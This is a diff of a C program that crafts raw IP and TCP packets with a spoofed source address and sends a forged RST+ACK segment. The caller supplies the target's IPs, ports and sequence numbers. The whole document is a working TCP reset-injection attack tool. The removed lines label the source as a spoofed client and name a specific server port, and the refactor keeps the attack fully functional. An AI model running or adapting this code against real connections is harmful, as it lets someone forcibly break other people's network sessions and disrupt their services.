@@ -3,7 +3,6 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <errno.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
 #include <netinet/ip.h>
@@ -11,103 +10,82 @@
 
 #include "checksum_helpers.h"
 
+// TCP flags
+#define TH_FIN  0x01
+#define TH_SYN  0x02
+#define TH_RST  0x04
+#define TH_PUSH 0x08
+#define TH_ACK  0x10
+#define TH_URG  0x20
+
 int main(int argc, char *argv[]) {
+
     if (argc != 7) {
         fprintf(stderr,
-                "Usage: %s <src_ip> <dst_ip> <src_port> <dst_port> <seq_num> <ack_num>\n",
-                argv[0]);
-        return EXIT_FAILURE;
+            "Usage: %s <src_ip> <dst_ip> <src_port> <dst_port> <seq> <ack>\n",
+            argv[0]);
+        exit(1);
     }
 
-    const char *src_ip_str = argv[1];   // spoofed source (client)
-    const char *dst_ip_str = argv[2];   // server IP
-    int src_port = atoi(argv[3]);       // client ephemeral port
-    int dst_port = atoi(argv[4]);       // 34933
-    unsigned long seq_num = strtoul(argv[5], NULL, 10);
-    unsigned long ack_num = strtoul(argv[6], NULL, 10);
+    const char *src_ip = argv[1];
+    const char *dst_ip = argv[2];
+    int src_port = atoi(argv[3]);
+    int dst_port = atoi(argv[4]);
+    unsigned long seq = strtoul(argv[5], NULL, 10);
+    unsigned long ack = strtoul(argv[6], NULL, 10);
 
-    int sockfd;
-    char datagram[4096];
-    struct iphdr *iph;
-    struct tcphdr *tcph;
-    struct sockaddr_in sin;
-
-    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (sockfd < 0) {
-        perror("socket");
-        return EXIT_FAILURE;
-    }
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (sock < 0) { perror("socket"); exit(1); }
 
     int one = 1;
-    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-        perror("setsockopt IP_HDRINCL");
-        close(sockfd);
-        return EXIT_FAILURE;
-    }
+    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
 
-    memset(datagram, 0, sizeof(datagram));
+    char packet[4096];
+    memset(packet, 0, sizeof(packet));
 
-    iph = (struct iphdr *)datagram;
-    tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
+    struct iphdr  *iph  = (struct iphdr *)packet;
+    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
 
     // IP header
     iph->ihl = 5;
     iph->version = 4;
     iph->tos = 0;
     iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
-    iph->id = htons((unsigned short)rand());
-    iph->frag_off = 0;
+    iph->id = htons(rand());
     iph->ttl = 64;
     iph->protocol = IPPROTO_TCP;
+    iph->saddr = inet_addr(src_ip);
+    iph->daddr = inet_addr(dst_ip);
     iph->check = 0;
-    iph->saddr = inet_addr(src_ip_str);
-    iph->daddr = inet_addr(dst_ip_str);
 
     // TCP header
-    tcph->source = htons(src_port);
-    tcph->dest = htons(dst_port);
-    tcph->seq = htonl(seq_num);
-    tcph->ack_seq = htonl(ack_num);
-    tcph->doff = 5;
-    tcph->res1 = 0;
-    tcph->cwr = 0;
-    tcph->ece = 0;
-    tcph->urg = 0;
-    tcph->ack = 1;
-    tcph->psh = 0;
-    tcph->rst = 1;  // reset flag
-    tcph->syn = 0;
-    tcph->fin = 0;
-    tcph->window = htons(65535);
-    tcph->check = 0;
-    tcph->urg_ptr = 0;
+    tcph->th_sport = htons(src_port);
+    tcph->th_dport = htons(dst_port);
+    tcph->th_seq  = htonl(seq);
+    tcph->th_ack  = htonl(ack);
+    tcph->th_off  = 5;
+    tcph->th_flags = TH_RST | TH_ACK;
+    tcph->th_win  = htons(65535);
+    tcph->th_sum  = 0;
+    tcph->th_urp  = 0;
 
-    // IP checksum
-    iph->check = csum_ip((unsigned short *)datagram, sizeof(struct iphdr) / 2);
+    // checksums
+    iph->check = csum_ip((unsigned short *)packet, sizeof(struct iphdr)/2);
+    tcph->th_sum = csum_tcp((unsigned short *)packet, 0);
 
-    int payload_len = 0;
-    int payload_words = (payload_len + 1) / 2;
-
-    // TCP checksum
-    tcph->check = csum_tcp((unsigned short *)datagram, payload_words);
-
-    memset(&sin, 0, sizeof(sin));
+    struct sockaddr_in sin;
     sin.sin_family = AF_INET;
     sin.sin_port = htons(dst_port);
-    sin.sin_addr.s_addr = inet_addr(dst_ip_str);
+    sin.sin_addr.s_addr = inet_addr(dst_ip);
 
-    int packet_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
-
-    if (sendto(sockfd, datagram, packet_len, 0,
-               (struct sockaddr *)&sin, sizeof(sin)) < 0) {
+    if (sendto(sock, packet,
+               sizeof(struct iphdr) + sizeof(struct tcphdr),
+               0,
+               (struct sockaddr *)&sin, sizeof(sin)) < 0)
         perror("sendto");
-        close(sockfd);
-        return EXIT_FAILURE;
-    }
+    else
+        printf("Spoofed RST+ACK sent.\n");
 
-    printf("Spoofed RST sent from %s:%d to %s:%d seq=%lu ack=%lu\n",
-           src_ip_str, src_port, dst_ip_str, dst_port, seq_num, ack_num);
-
-    close(sockfd);
+    close(sock);
     return 0;
 }
